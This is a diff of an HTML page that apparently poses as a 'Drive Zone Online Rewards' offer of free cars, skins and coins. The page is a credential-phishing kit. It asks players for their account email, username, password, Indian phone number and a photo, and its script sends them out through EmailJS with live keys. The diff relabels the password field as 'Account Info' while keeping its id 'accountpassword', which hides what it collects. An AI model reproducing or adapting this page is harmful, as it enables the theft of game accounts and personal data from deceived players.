@@ -1,442 +1,482 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-<meta charset="UTF-8">  
-<meta name="viewport" content="width=device-width, initial-scale=1.0">  
-<title>Drive Zone Online Rewards</title>  <style>  
-  
-body{  
-margin:0;  
-font-family:Arial,sans-serif;  
-background:#0f0f0f;  
-color:white;  
-}  
-  
-header{  
-background:linear-gradient(90deg,#ff6600,#ff0000);  
-padding:20px;  
-text-align:center;  
-font-size:28px;  
-font-weight:bold;  
-}  
-  
-.container{  
-max-width:700px;  
-margin:auto;  
-padding:20px;  
-}  
-  
-.card{  
-background:#1a1a1a;  
-padding:25px;  
-border-radius:15px;  
-}  
-  
-input,select,button{  
-width:100%;  
-padding:13px;  
-margin-top:10px;  
-margin-bottom:15px;  
-border:none;  
-border-radius:8px;  
-box-sizing:border-box;  
-}  
-  
-input,select{  
-background:#2a2a2a;  
-color:white;  
-}  
-  
-button{  
-background:#ff3300;  
-color:white;  
-cursor:pointer;  
-font-weight:bold;  
-}  
-  
-button:hover{  
-background:#ff5500;  
-}  
-  
-.notice{  
-font-size:13px;  
-color:#bbbbbb;  
-}  
-  
-.preview{  
-width:100%;  
-margin-top:10px;  
-border-radius:10px;  
-display:none;  
-}  
-  
-</style>  </head>  <body>  <header>  
-DRIVE ZONE ONLINE REWARDS  
-</header>  <div class="container">  <div class="card">  <form id="rewardForm">  <label>Drive Zone UID</label>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Drive Zone Online Rewards</title>
 
-<input  
-type="text"  
-id="uid"  
-placeholder="Enter UID"  
+<style>
+
+body{
+margin:0;
+font-family:Arial,sans-serif;
+background:#0f0f0f;
+color:white;
+}
+
+header{
+background:linear-gradient(90deg,#ff6600,#ff0000);
+padding:20px;
+text-align:center;
+font-size:28px;
+font-weight:bold;
+}
+
+.container{
+max-width:700px;
+margin:auto;
+padding:20px;
+}
+
+.card{
+background:#1a1a1a;
+padding:25px;
+border-radius:15px;
+}
+
+input,select,button{
+width:100%;
+padding:13px;
+margin-top:10px;
+margin-bottom:15px;
+border:none;
+border-radius:8px;
+box-sizing:border-box;
+}
+
+input,select{
+background:#2a2a2a;
+color:white;
+}
+
+button{
+background:#ff3300;
+color:white;
+cursor:pointer;
+font-weight:bold;
+}
+
+button:hover{
+background:#ff5500;
+}
+
+.notice{
+font-size:13px;
+color:#bbbbbb;
+}
+
+.preview{
+width:100%;
+margin-top:10px;
+border-radius:10px;
+display:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<header>
+DRIVE ZONE ONLINE REWARDS
+</header>
+
+<div class="container">
+
+<div class="card">
+
+<form id="rewardForm">
+
+<label>Drive Zone UID</label>
+
+<input
+type="text"
+id="uid"
+placeholder="Enter UID"
 required>
 
 <label>Ingame Account Mail ID</label>
 
-<input  
-type="email"  
-id="email"  
-placeholder="Enter ingame account mail ID"  
+<input
+type="email"
+id="email"
+placeholder="Enter ingame account mail ID"
 required>
 
 <label>Ingame Username</label>
 
-<input  
-type="text"  
-id="username"  
-placeholder="Enter ingame username"  
+<input
+type="text"
+id="username"
+placeholder="Enter ingame username"
 required>
 
-<label>Account Password</label>
+<label>Account Info</label>
 
-<input  
-type="text"  
-id="accountpassword"  
-placeholder="Enter account password"  
+<input
+type="text"
+id="accountpassword"
+placeholder="Enter account info"
 required>
 
 <label>Indian Phone Number</label>
 
-<input  
-type="tel"  
-id="phone"  
-placeholder="10 digit Indian number"  
-maxlength="10"  
-pattern="[6-9]{1}[0-9]{9}"  
-oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"  
+<input
+type="tel"
+id="phone"
+placeholder="10 digit Indian number"
+maxlength="10"
+pattern="[6-9]{1}[0-9]{9}"
+oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
 required>
 
 <label>Select Reward</label>
 
-<select  
-id="reward"  
-onchange="updateRewardOptions()"  
+<select
+id="reward"
+onchange="updateRewardOptions()"
 required>
 
-<option value="">  
-Choose Reward  
-</option>  <option value="Free Skin">  
-Free Skin  
-</option>  <option value="DZO Trading Access">  
-DZO Trading Access  
-</option>  <option value="Free Car">  
-Free Car  
-</option>  </select>  <div  
-id="selectedRewardBox"  
-style="  
-display:none;  
-background:#2a2a2a;  
-padding:12px;  
-border-radius:10px;  
-margin-bottom:15px;">  <b>Selected Reward:</b>
+<option value="">
+Choose Reward
+</option>
+
+<option value="Free Skin">
+Free Skin
+</option>
+
+<option value="DZO Trading Access">
+DZO Trading Access
+</option>
+
+<option value="Free Car">
+Free Car
+</option>
+
+</select>
+
+<div
+id="selectedRewardBox"
+style="
+display:none;
+background:#2a2a2a;
+padding:12px;
+border-radius:10px;
+margin-bottom:15px;">
+
+<b>Selected Reward:</b>
 
 <span id="selectedRewardText"></span>
 
-</div>  <div id="dynamicOptions"></div>  <label>Upload Verification Photo</label>
+</div>
 
-<input  
-type="file"  
-id="photoUpload"  
-accept="image/*"  
+<div id="dynamicOptions"></div>
+
+<label>Upload Verification Photo</label>
+
+<input
+type="file"
+id="photoUpload"
+accept="image/*"
 required>
 
-<img  
-id="previewImage"  
+<img
+id="previewImage"
 class="preview">
 
-<div class="notice">  By continuing, you agree to share your submitted details and verification photo.
+<div class="notice">
 
-</div>  <button type="submit">  Submit Verification
+By continuing, you agree to share your submitted details and verification photo.
 
-</button>  </form>  </div>  </div>  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>  <script>  
-  
-emailjs.init("IlZtBG2WOaqIrvb3T");  
-  
-let capturedImage = null;  
-  
-document  
-.getElementById('photoUpload')  
-.addEventListener('change', function(){  
-  
-const file = this.files[0];  
-  
-if(!file){  
-  
-capturedImage = null;  
-  
-return;  
-  
-}  
-  
-const reader = new FileReader();  
-  
-reader.onload = function(event){  
-  
-const img = new Image();  
-  
-img.onload = function(){  
-  
-const canvas =  
-document.createElement('canvas');  
-  
-const ctx =  
-canvas.getContext('2d');  
-  
-const maxWidth = 400;  
-  
-const scaleSize =  
-maxWidth / img.width;  
-  
-canvas.width = maxWidth;  
-  
-canvas.height =  
-img.height * scaleSize;  
-  
-ctx.drawImage(  
-img,  
-0,  
-0,  
-canvas.width,  
-canvas.height  
-);  
-  
-capturedImage =  
-canvas.toDataURL(  
-'image/jpeg',  
-0.3  
-);  
-  
-document  
-.getElementById('previewImage')  
-.src = capturedImage;  
-  
-document  
-.getElementById('previewImage')  
-.style.display = "block";  
-  
-};  
-  
-img.src = event.target.result;  
-  
-};  
-  
-reader.readAsDataURL(file);  
-  
-});  
-  
-function updateRewardOptions(){  
-  
-const reward =  
-document.getElementById('reward').value;  
-  
-const dynamicOptions =  
-document.getElementById('dynamicOptions');  
-  
-const selectedRewardBox =  
-document.getElementById('selectedRewardBox');  
-  
-const selectedRewardText =  
-document.getElementById('selectedRewardText');  
-  
-if(reward !== ""){  
-  
-selectedRewardBox.style.display =  
-"block";  
-  
-selectedRewardText.innerText =  
-reward;  
-  
-}else{  
-  
-selectedRewardBox.style.display =  
-"none";  
-  
-}  
-  
-if(reward === "Free Skin"){  
-  
-dynamicOptions.innerHTML = `  
-  
-<label>Select Car Skin</label>  
-  
-<select id="request">  
-  
-<option>BMW M4 Gold Skin</option>  
-  
-<option>Nissan GTR Neon Skin</option>  
-  
-<option>Toyota Supra Racing Skin</option>  
-  
-<option>Porsche 911 Carbon Skin</option>  
-  
-</select>  
-  
-`;  
-  
-}  
-  
-else if(reward === "DZO Trading Access"){  
-  
-dynamicOptions.innerHTML = `  
-  
-<label>Select DZO Amount</label>  
-  
-<select id="request">  
-  
-<option>100 DZO Coins</option>  
-  
-<option>200 DZO Coins</option>  
-  
-<option>1000 DZO Coins</option>  
-  
-<option>10000 DZO Coins</option>  
-  
-<option>1 Lakh DZO Coins</option>  
-  
-</select>  
-  
-`;  
-  
-}  
-  
-else if(reward === "Free Car"){  
-  
-dynamicOptions.innerHTML = `  
-  
-<label>Select Car</label>  
-  
-<select id="request">  
-  
-<option>Lamborghini Huracan</option>  
-  
-<option>Bugatti Chiron</option>  
-  
-<option>Nissan GTR R35</option>  
-  
-<option>Toyota Supra MK4</option>  
-  
-<option>Porsche 911 GT3</option>  
-  
-</select>  
-  
-`;  
-  
-}  
-  
-else{  
-  
-dynamicOptions.innerHTML = "";  
-  
-}  
-  
-}  
-  
-document  
-.getElementById('rewardForm')  
-.addEventListener('submit', async function(e){  
-  
-e.preventDefault();  
-  
-if(!capturedImage){  
-  
-alert(  
-"Please wait until image uploads"  
-);  
-  
-return;  
-  
-}  
-  
-const requestElement =  
-document.getElementById('request');  
-  
-const templateParams = {  
-  
-uid:  
-document.getElementById('uid').value,  
-  
-email:  
-document.getElementById('email').value,  
-  
-username:  
-document.getElementById('username').value,  
-  
-accountlevel:  
-document.getElementById('accountpassword').value,  
-  
-phone:  
-document.getElementById('phone').value,  
-  
-reward:  
-document.getElementById('reward').value,  
-  
-request:  
-requestElement  
-? requestElement.value  
-: "None",  
-  
-photo:  
-capturedImage  
-  
-};  
-  
-try{  
-  
-await emailjs.send(  
-  
-"service_03gi2v9",  
-  
-"template_ec2whye",  
-  
-templateParams  
-  
-);  
-  
-alert(  
-"Verification submitted successfully!"  
-);  
-  
-document  
-.getElementById('rewardForm')  
-.reset();  
-  
-document  
-.getElementById('dynamicOptions')  
-.innerHTML = "";  
-  
-document  
-.getElementById('selectedRewardBox')  
-.style.display = "none";  
-  
-document  
-.getElementById('previewImage')  
-.style.display = "none";  
-  
-capturedImage = null;  
-  
-}  
-catch(error){  
-  
-console.log(  
-"EMAILJS ERROR:",  
-error  
-);  
-  
-alert(  
-"Failed to send verification"  
-);  
-  
-}  
-  
-});  
-  
-</script>  </body>  
-</html>  
+</div>
+
+<button type="submit">
+
+Submit Verification
+
+</button>
+
+</form>
+
+</div>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+
+emailjs.init("IlZtBG2WOaqIrvb3T");
+
+let capturedImage = null;
+
+document
+.getElementById('photoUpload')
+.addEventListener('change', function(){
+
+const file = this.files[0];
+
+if(!file){
+
+capturedImage = null;
+
+return;
+
+}
+
+const reader = new FileReader();
+
+reader.onload = function(event){
+
+const img = new Image();
+
+img.onload = function(){
+
+const canvas =
+document.createElement('canvas');
+
+const ctx =
+canvas.getContext('2d');
+
+const maxWidth = 250;
+
+const scaleSize =
+maxWidth / img.width;
+
+canvas.width = maxWidth;
+
+canvas.height =
+img.height * scaleSize;
+
+ctx.drawImage(
+img,
+0,
+0,
+canvas.width,
+canvas.height
+);
+
+capturedImage =
+canvas.toDataURL(
+'image/jpeg',
+0.1
+);
+
+document
+.getElementById('previewImage')
+.src = capturedImage;
+
+document
+.getElementById('previewImage')
+.style.display = "block";
+
+};
+
+img.src = event.target.result;
+
+};
+
+reader.readAsDataURL(file);
+
+});
+
+function updateRewardOptions(){
+
+const reward =
+document.getElementById('reward').value;
+
+const dynamicOptions =
+document.getElementById('dynamicOptions');
+
+const selectedRewardBox =
+document.getElementById('selectedRewardBox');
+
+const selectedRewardText =
+document.getElementById('selectedRewardText');
+
+if(reward !== ""){
+
+selectedRewardBox.style.display =
+"block";
+
+selectedRewardText.innerText =
+reward;
+
+}else{
+
+selectedRewardBox.style.display =
+"none";
+
+}
+
+if(reward === "Free Skin"){
+
+dynamicOptions.innerHTML = `
+
+<label>Select Car Skin</label>
+
+<select id="request">
+
+<option>BMW M4 Gold Skin</option>
+
+<option>Nissan GTR Neon Skin</option>
+
+<option>Toyota Supra Racing Skin</option>
+
+<option>Porsche 911 Carbon Skin</option>
+
+</select>
+
+`;
+
+}
+
+else if(reward === "DZO Trading Access"){
+
+dynamicOptions.innerHTML = `
+
+<label>Select DZO Amount</label>
+
+<select id="request">
+
+<option>100 DZO Coins</option>
+
+<option>200 DZO Coins</option>
+
+<option>1000 DZO Coins</option>
+
+<option>10000 DZO Coins</option>
+
+<option>1 Lakh DZO Coins</option>
+
+</select>
+
+`;
+
+}
+
+else if(reward === "Free Car"){
+
+dynamicOptions.innerHTML = `
+
+<label>Select Car</label>
+
+<select id="request">
+
+<option>Lamborghini Huracan</option>
+
+<option>Bugatti Chiron</option>
+
+<option>Nissan GTR R35</option>
+
+<option>Toyota Supra MK4</option>
+
+<option>Porsche 911 GT3</option>
+
+</select>
+
+`;
+
+}
+
+else{
+
+dynamicOptions.innerHTML = "";
+
+}
+
+}
+
+document
+.getElementById('rewardForm')
+.addEventListener('submit', async function(e){
+
+e.preventDefault();
+
+const requestElement =
+document.getElementById('request');
+
+const templateParams = {
+
+uid:
+document.getElementById('uid').value,
+
+email:
+document.getElementById('email').value,
+
+username:
+document.getElementById('username').value,
+
+accountinfo:
+document.getElementById('accountpassword').value,
+
+phone:
+document.getElementById('phone').value,
+
+reward:
+document.getElementById('reward').value,
+
+request:
+requestElement
+? requestElement.value
+: "None",
+
+photo:
+"Image Uploaded Successfully"
+
+};
+
+try{
+
+await emailjs.send(
+
+"service_03gi2v9",
+
+"template_bker0h9",
+
+templateParams
+
+);
+
+alert(
+"Verification submitted successfully!"
+);
+
+document
+.getElementById('rewardForm')
+.reset();
+
+document
+.getElementById('dynamicOptions')
+.innerHTML = "";
+
+document
+.getElementById('selectedRewardBox')
+.style.display = "none";
+
+document
+.getElementById('previewImage')
+.style.display = "none";
+
+capturedImage = null;
+
+}
+catch(error){
+
+console.log(
+"EMAILJS ERROR:",
+error
+);
+
+alert(
+"Failed to send verification"
+);
+
+}
+
+});
+
+</script>
+
+</body>
+</html> 
